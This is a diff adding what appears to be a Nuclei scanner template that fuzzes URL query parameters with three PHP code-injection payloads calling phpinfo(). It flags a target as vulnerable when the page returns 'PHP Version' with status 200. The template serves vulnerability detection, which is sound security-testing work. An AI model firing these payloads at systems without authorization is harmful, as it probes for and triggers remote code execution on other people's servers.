@@ -1,0 +1,37 @@
+id: phpinfo-code-exec
+
+info:
+  name: Code Execution via Log Injection
+  author: reewardius
+  severity: medium
+  reference: https://owasp.org/www-community/attacks/Log_Injection
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      php:
+        - "`<?php echo phpinfo(); ?>`"
+        - "{${phpinfo()}}"
+        - "data:text/plain,<?php phpinfo(); ?>"
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{php}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PHP Version"
+      - type: status
+        status:
+          - 200
